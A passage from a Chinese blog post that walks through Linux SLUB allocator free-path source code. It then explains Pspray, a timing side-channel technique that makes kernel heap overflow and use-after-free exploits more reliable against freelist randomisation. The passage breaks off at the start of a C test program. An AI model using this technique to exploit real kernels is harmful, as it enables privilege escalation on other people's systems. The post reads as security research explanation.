class="line">local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">tid = c-&gt;tid;</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line"></span><br><span class="line">set_freepointer(s, tail_obj, freelist);</span><br><span class="line">c-&gt;freelist = head;</span><br><span class="line">c-&gt;tid = next_tid(tid);</span><br><span class="line"></span><br><span class="line">local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line">stat(s, FREE_FASTPATH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里依旧分为两条路径，首先会比较待释放的对象所属于的slab是否是<code>percpu slab</code>，如果是则直接挂回去即可，遵循LIFO机制。</p><p>如果不是则会进入到<code>__slab_free</code>函数中进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __slab_free(struct kmem_cache *s, struct slab *slab,</span><br><span class="line"><span class="keyword">void</span> *head, <span class="keyword">void</span> *tail, <span class="keyword">int</span> cnt,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *prior;</span><br><span class="line"><span class="keyword">int</span> was_frozen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">stat(s, FREE_SLOWPATH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kfence_free(head))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;</span><br><span class="line">free_to_partial_list(s, slab, head, tail, cnt, addr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(n)) &#123;</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">n = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">prior = slab-&gt;freelist;</span><br><span class="line">counters = slab-&gt;counters;</span><br><span class="line">set_freepointer(s, tail, prior);</span><br><span class="line"><span class="keyword">new</span>.counters = counters;</span><br><span class="line">was_frozen = <span class="keyword">new</span>.frozen;</span><br><span class="line"><span class="keyword">new</span>.inuse -= cnt;</span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">new</span>.inuse || !prior) &amp;&amp; !was_frozen) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab was on no list before and will be</span></span><br><span class="line"><span class="comment"> * partially empty</span></span><br><span class="line"><span class="comment"> * We can defer the list move and instead</span></span><br><span class="line"><span class="comment"> * freeze it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">new</span>.frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">/* Needs to be taken off a list */</span></span><br><span class="line"></span><br><span class="line">n = get_node(s, slab_nid(slab));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Speculatively acquire the list_lock.</span></span><br><span class="line"><span class="comment"> * If the cmpxchg does not succeed then we may</span></span><br><span class="line"><span class="comment"> * drop the list_lock without any processing.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise the list_lock will synchronize with</span></span><br><span class="line"><span class="comment"> * other processors updating the list of slabs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (!slab_update_freelist(s, slab,</span><br><span class="line">prior, counters,</span><br><span class="line">head, <span class="keyword">new</span>.counters,</span><br><span class="line"><span class="string">&quot;__slab_free&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(!n)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(was_frozen)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The list lock was not taken therefore no list</span></span><br><span class="line"><span class="comment"> * activity can be necessary.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">stat(s, FREE_FROZEN);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">new</span>.frozen) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we just froze the slab then put it onto the</span></span><br><span class="line"><span class="comment"> * per cpu partial list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">put_cpu_partial(s, slab, <span class="number">1</span>);</span><br><span class="line">stat(s, CPU_PARTIAL_FREE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!<span class="keyword">new</span>.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))</span><br><span class="line"><span class="keyword">goto</span> slab_empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Objects left in the slab. If it was not on the partial list before</span></span><br><span class="line"><span class="comment"> * then add it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;</span><br><span class="line">remove_full(s, n, slab);</span><br><span class="line">add_partial(n, slab, DEACTIVATE_TO_TAIL);</span><br><span class="line">stat(s, FREE_ADD_PARTIAL);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">slab_empty:</span><br><span class="line"><span class="keyword">if</span> (prior) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab on the partial list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">remove_partial(n, slab);</span><br><span class="line">stat(s, FREE_REMOVE_PARTIAL);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Slab must be on the full list */</span></span><br><span class="line">remove_full(s, n, slab);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">stat(s, FREE_SLAB);</span><br><span class="line">discard_slab(s, slab);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先还是<code>kfence</code>和<code>kmem_cache_debug</code>相关，如果设置了<code>SLAB_DEBUG_FLAGS</code>则直接调用<code>free_to_partial_list</code>函数后返回即可。</p><p>随后进入循环，这里首先将待释放<code>freelist</code>所属于的slab的<code>freelist</code>写到带释放<code>freelist</code>对应的位置，这里new是栈上的临时slab结构体。</p><p>然后进行判断，slab的所有对象都未被使用或者slab上没有空闲的对象并且slab未被冻结，则会进入分支中。进入分支之后继续判断，首先查看是否有<code>percpu partial slab</code>并且slab上没有空闲的对象，如果成立则让该slab冻结，如果不是则获取slab所对应的<code>kmem_cahce_node</code>。</p><p>结束循环后，会判断是否找到<code>kmem_cache_node</code>，如果没有找到则进入分支中，如果slab已被冻结，则什么都不敢，若需要被冻结则调用<code>put_cpu_partial</code>函数直接将slab放入到<code>percpu partial</code>链表中，完成释放工作。</p><p>接下来会判断，slab的被使用的对象的数量是否为0并且<code>n-&gt;nr_partial == s-&gt;min_partial</code>的话就代表该slab的所有的对象都被释放掉了并且node上的<code>partial slab</code>数量已经超过<code>min_partial</code>了，这时会跳入<code>slab_empty</code>标签中。在<code>slab_empty</code>标签的逻辑比较简单，判断当前slab原先是否有空闲对象，然后选择从对应的地方移除，最后调用<code>discard_slab</code>函数，释放该slab到内存中。</p><p>如果不满足会做一些检查，并且如果以前该slab位于full也将被移到<code>partial</code>中。</p><h3 id="kfree"><a href="#kfree" class="headerlink" title="kfree"></a>kfree</h3><p>上面是释放对象的核心函数逻辑，下面一样提一下上层函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">trace_kfree(_RET_IP_, object);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">folio = virt_to_folio(object);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;</span><br><span class="line">free_large_kmalloc(folio, (<span class="keyword">void</span> *)object);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slab = folio_slab(folio);</span><br><span class="line">s = slab-&gt;slab_cache;</span><br><span class="line">__kmem_cache_free(s, (<span class="keyword">void</span> *)object, _RET_IP_);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kfree);</span><br></pre></td></tr></table></figure><p>这里出现了一个遗忘不熟悉的结构体<code>folio</code>，这里简单提一下，其表示的是一块物理，虚拟，逻辑上都是连续的内存，其本质是复用page结构体然后将其转化为了<code>folio</code>结构体。</p><p>可以看到函数最先使用<code>virt_to_folio</code>函数得到了<code>folio</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct folio *<span class="title">virt_to_folio</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> virt_to_page(x);</span><br><span class="line"><span class="keyword">return</span> page_folio(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先调用<code>virt_to_page</code>函数从虚拟地址找到其页面，随后调用<code>page_folio</code>函数从页面获得<code>folio</code>结构体。</p><p>然后根据名字就能看出来<code>free_large_kmalloc</code>主要用于free大的对象，而大的对象是以复合页的形式存在的，所以如果是复合页则会进入到if分支中，如果不是则进入到下面的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_large_kmalloc</span><span class="params">(struct folio *folio, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order = folio_order(folio);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(order == <span class="number">0</span>))</span><br><span class="line">pr_warn_once(<span class="string">&quot;object pointer: 0x%p\n&quot;</span>, object);</span><br><span class="line"></span><br><span class="line">kmemleak_free(object);</span><br><span class="line">kasan_kfree_large(object);</span><br><span class="line">kmsan_kfree_large(object);</span><br><span class="line"></span><br><span class="line">mod_lruvec_page_state(folio_page(folio, <span class="number">0</span>), NR_SLAB_UNRECLAIMABLE_B,</span><br><span class="line">      -(PAGE_SIZE &lt;&lt; order));</span><br><span class="line">__free_pages(folio_page(folio, <span class="number">0</span>), order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数在最后直接调用了<code>__free_pages</code>将对象返回给了<code>buddy system</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __kmem_cache_free(struct kmem_cache *s, <span class="keyword">void</span> *x, <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">slab_free(s, virt_to_slab(x), x, <span class="literal">NULL</span>, &amp;x, <span class="number">1</span>, caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而面对普通的对象释放是调用的<code>__kmem_cache_free</code>函数其内部其实就是调用了<code>slab_free</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __fastpath_inline <span class="keyword">void</span> <span class="title">slab_free</span><span class="params">(struct kmem_cache *s, struct slab *slab,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">void</span> *head, <span class="keyword">void</span> *tail, <span class="keyword">void</span> **p, <span class="keyword">int</span> cnt,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">memcg_slab_free_hook(s, slab, p, cnt);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span></span><br><span class="line"><span class="comment"> * to remove objects, whose reuse must be delayed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))</span><br><span class="line">do_slab_free(s, slab, head, tail, cnt, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>slab_free</code>函数内部最终也会调用到前面分析了<code>do_slab_free</code>函数。</p><h2 id="Pspray简单介绍"><a href="#Pspray简单介绍" class="headerlink" title="Pspray简单介绍"></a>Pspray简单介绍</h2><p>在前面分析<code>slab_alloc_node</code>的函数中发现了存在了两条路，两条路的名字分别为<code>fast path</code>和<code>slow path</code>，而这一利用手法就是基于上述的代码完成的，这是一项基于时序侧信道的漏洞利用技术，通过此方法可以大幅度提高内核漏洞利用成功率。</p><p>众所周知，在内核中有很多 <del>动物朋友</del> 保护机制，比如CFI，KASLR等诸多保护，使得攻击者十分难以完成利用。而且现如今的内核加入了<code>shadow stack</code>并且近期爆出的诸多漏洞也都和堆相关，所以内核的堆利用一直都是内核漏洞的主流门派。但是玩过堆的应该都知道内核存在一种机制是<code>slab freelist</code>随机化，让攻击者无法预测到即将申请的堆块在何处，这也就使得更加难以利用了。</p><p>而今天给大家介绍的一种利用手法<code>Pspray</code>可以用来很好的对抗<code>slab freelist</code>的随机化。</p><h2 id="现状分析"><a href="#现状分析" class="headerlink" title="现状分析"></a>现状分析</h2><p><img   src="/images/image-20231123153331621.png"  alt="image-20231123153331621"></p><p>上图十分简单明了的给出了分配一个对象的流程。</p><ol><li>如果在<code>cpu freelist</code>中有则直接取，如果没有进入下一阶段</li><li>这里从<code>cpu page freelist</code>中取，操作主要是用<code>cpu page freelist</code>给到<code>cpu freelist</code>，即<code>freelist</code>的初始化</li><li>这里从<code>cpu partial list</code>中取</li><li>这里从<code>node partial list</code>中取</li><li>全都没了就向<code>buddy system</code>申请</li></ol><p>然后就是<code>Slab Freelist Random</code>机制，当开启<code>CONFIG_SLAB_FREELIST_RANDOM</code>选项时会开启保护，主要形式如下图所示</p><p><img   src="/images/image-20231123155055348.png"  alt="image-20231123155055348"></p><h3 id="Out-Of-Bounds"><a href="#Out-Of-Bounds" class="headerlink" title="Out Of Bounds"></a>Out Of Bounds</h3><p>在堆利用中时常会遇到堆溢出的漏洞，一般来说我们都期望能够实现下图这样堆的形式</p><p><img   src="/images/image-20231123155332029.png"  alt="image-20231123155332029"></p><p>但是事与愿违，因为地址随机化的存在大概率会成为下图这样</p><p><img   src="/images/image-20231123155423929.png"  alt="image-20231123155423929"></p><p>中间可能隔着其他结构体，一类的情况。</p><p>在开启 freelist 随机化之后的漏洞利用成功率如下，基于 Linux kernel 使用 <code>Fisher-Yates shuffle</code> 算法来进行随机化这个前提计算的，其中N为一张 slub 上的总对象数，同时我们假设在同一张 slab 上分配了 1 个漏洞对象与k个 victim 对象：</p><p><img   src="/images/image-20231123155859344.png"  alt="image-20231123155859344"></p><p>（不会写数学公式）</p><p>总体而言，我们从N个空闲对象中选择k个 victim 对象 与 1 个漏洞对象，在进行利用时 victim 对象与漏洞对象必须相邻，因此我们从N−1 个对象中取出k个对象（还有一个作为漏洞对象），喷射的 victim 对象数量可以从 0 到 N−1 ，因此对于带有 random slab freelist 的 OOB 利用而言的成功率计算如下：</p><p><img   src="/images/image-20231123160048017.png"  alt="image-20231123160048017"></p><h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><p><img   src="/images/image-20231123160326552.png"  alt="image-20231123160326552"></p><p>UAF 漏洞的利用通常是要将漏洞对象与 victim 对象放在同一内存地址，上图展示了对 CVE-2019-2215 的利用过程，首先用 <code>epoll_ctl()</code> 分配漏洞对象，接下来用 <code>ioctl()</code> 释放漏洞对象，随后用 <code>msgsnd()</code> 取回刚刚释放的对象，最后再用 <code>close()</code> 将该对象释放</p><p><img   src="/images/image-20231123160510337.png"  alt="image-20231123160510337"></p><p>上图主要展示了UAF的失败案例，UAF的成功率如下</p><p><img   src="/images/image-20231123160657856.png"  alt="image-20231123160657856"></p><p>上式中A表示的分配的对象数量，N表示一张slab拥有的对象数量。漏洞利用失败的主要原因是对 slab 信息的缺失，本文找到了一种能够获取 slab 的部分分配信息的时序侧信道方法，从而提高利用成功概率。</p><h2 id="利用原理分析"><a href="#利用原理分析" class="headerlink" title="利用原理分析"></a>利用原理分析</h2><p>如前面的一张图所示，SLUB 有五条不同深度的分配路径以优化性能表现，为了弄清不同路径的表现，作者通过 <code>msgsnd()</code> 系统调用测试了从 <code>kmalloc()</code> 的核心函数 <code>slab_alloc_node()</code> 的开始到结尾的性能，经过多轮测试发现 <code>slow-path</code> 与其他路径相比存在明显的表现差距，因此攻击者可以通过测量分配时间得知内存分配所经历的路径。</p><p><code>slow-path</code> 以外的分配路径的分配状态都是难以确定的，但 <code>slow-path</code> 的行为与其他路径不同，此时内核会从<code>buddy system</code>分配一张新 slab，由此我们可以知道当前的 slab 刚被分配且仅分配了一个对象</p><p>为了能够使用时序侧信道攻击，需要找到满足这样三个条件的系统调用，首先是普通用户可以使用，其次只分配一个对象，最后除了分配对象外性能开销较小。</p><p><img   src="/images/image-20231123162356541.png"  alt="image-20231123162356541"></p><p>这里原作者找到了满足上面三个条件并且从涵盖<code>kmalloc-32</code>到<code>kmalloc-8192</code>的系统调用。</p><p><img   src="/images/image-20231123162555768.png"  alt="image-20231123162555768"></p><p>这里使用<code>msgsnd</code>系统调用测试得到了如上图所示的结果，可以知道的事<code>fast path</code>和<code>medium path</code>一般来说较为难以区分，但是在<code>slow path</code>时会有很明显的时间差。</p><p><img   src="/images/image-20231123162822451.png"  alt="image-20231123162822451"></p><p>上图展示了利用<code>Pspray</code>的流程：</p><ol><li>首先使用<code>Pspray</code>确定了<code>slow path</code>被执行，此时意味着当前的<code>cpu slab</code>是新向<code>buddy system</code>申请的slab</li><li>接下来堆喷N-1个对象使其完全被分配</li><li>此时如果再次申请一个对象则又回进入到<code>slow path</code>中，并且是一个全部为空的slab</li><li>不难想到的是如果我们的<code>Vuln object</code>不在高地址那么就一定可以完成漏洞利用</li></ol><p>此时利用的成功率为</p><p><img   src="/images/image-20231123163220066.png"  alt="image-20231123163220066"></p><p><img   src="/images/image-20231123163250150.png"  alt="image-20231123163250150"></p><p>后面的UAF的流程和上述类似，并且其成功率为</p><p><img   src="/images/image-20231123163335334.png"  alt="image-20231123163335334"></p><h3 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">    <span class="keyword">uint64_t</span> prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span> m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">    <span class="keyword">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bind_cpu</span><span class="params">(<span class="keyword">int</span> core)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 